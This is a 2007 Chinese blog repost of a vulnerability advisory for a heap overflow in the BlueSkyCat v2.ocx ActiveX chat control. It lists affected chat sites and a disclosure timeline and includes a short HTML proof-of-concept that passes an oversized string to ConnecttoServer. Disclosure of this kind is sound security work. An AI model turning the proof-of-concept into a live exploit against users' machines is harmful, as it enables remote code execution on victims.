---
title: "视频语音聊天系统的漏洞"
date: 2007-07-31T00:00:00+08:00
tags: ["Tech"]
draft: false
slug: "blog-xfocus-2792"
---

有个哥们最近在源代码漏洞发掘和黑箱测试方面有蛮大突破，下面是从他网站上转过来的，他用工具发现的视频语音聊天工具（包括碧聊等一堆的聊天网站都受影响）的漏洞。如果有企业有代码审计或黑盒测试方面的需求，不妨联系联系他
:)

    CAL-20070730-1 BlueSkyCat ActiveX远程代码执行漏洞

我们是代码审计实验室(Code Audit Labs http://www.vulnhunt.com/).

为保护客户安全，我们对"蓝天专业可视语音聊天系统"blueskycat v2.ocx

(version 8.1.2.0) 文件做了下内部审计。blueskycat是应用广泛的语音和

视频聊天室软件，由blueSky.cn开发.

发现几处v2.ocx ActiveX的安全漏洞，远程攻击者可能利用此漏洞控制用户机器。

该文原始连接

1:
http://www.vulnhunt.com/advisories/CAL-20070730-1_BlueSkyCat_v2.ocx_ActiveX_remote_heap_overflow_vulnerability.txt

2: http://CodeAudit.blogspot.com

CVE：

====

We request a CVE number to assign to this vulnerability.

细节：

=====

  BlueSkyCat所安装的v2.ocx控件中的ConnecttoServer函数没有正确验证用户输入

参数,如果用户受骗访问了恶意页面的话，就可能触发堆溢出，导致执行任意指令。

从而控制安装有受影响版本的BlueSkyCat软件的用户机器。

以下您的客户的客户的机器都会受到影响

碧聊         
http://www.bliao.com

QQ聊         
http://www.qqliao.com

七聊         
http://www.7liao.com

好聊         
http://www.haoliao.net

我要聊         
http://chat.51liao.net

圣域佛教      http://www.heshang.net

喜满你         
http://vchat.xicn.net

CN104         
http://www.cn104.com

学聊         
http://www.liao-tian.com

情聊         
http://www.aliao.net

快聊         
http://www.kuailiao.com

模特聊         
http://www.mtliao.com

北国娱乐网    http://www.pj0427.com

维语聊         
http://chat.uighur.cn

舞魅聊         
http://www.wmliao.com

受影响版本:

===========

v2.ocx  version 8.1.2.0(当前最新版本) 和以前版本

厂家:

=====

BlueSky

测试代码：

========

<html>

<head>

<OBJECT ID="com"
CLASSID="CLSID:{2EA6D939-4445-43F1-A12B-8CB3DDA8B855}">

</OBJECT>

</head>

<body>

<SCRIPT language="javascript">

function ClickForRunCalc()

{

    var heapSprayToAddress = 0x0d0d0d0d;

    var payLoadCode = "A" ;

    while (payLoadCode.length <= 10000)
payLoadCode+='A';

   
com.ConnecttoServer("1",payLoadCode,"3","4","5");

}

</script>

<button
onclick="__javascript:ClickForRunCalc();">ClickForRunCalc</button>

</body>

</html>

代码审计实验室建议：

==================

Code Audit Labs建议厂家自己进行一次全面的代码安全检查(Code Audit or Code

Review)，同时我们Code Audit Labs也提供代码审计(Code Audit)服务,假如您需要

我们的服务，请联系

mailto:Vulnhunt@gmail.com?subject=request code review service.

同时，为保护您所创建的价值，我们会等到您修复该漏洞后公告该漏洞。

假如您申请我们的Code Audit服务，那么，我们有义务为您保持该信息。

时间表：

======

1: 2007-07-29 通知厂家 (mail to blueskychat@gmail.com)

2: 2007-07-29 厂家回复说已经升级。

3: 2007-07-30 经过我们的确认，bluesky的客户都还没有升级他们的程序。

  都还处在危险之中,发信通知vendor)

4: 2007-07-31 发布该漏洞

 

关于我们:

=========

 代码审计实验室(Code Audit Labs)致力于自动化代码审计(包括源代码和二进制代码)

研究和开发,为提高软件安全测试的效率以及软件代码质量不懈努力.

 Code Audit Labs信念: "您为客户创造价值，我们保护您创造的价值。"

 http://www.VulnHunt.com

EOF
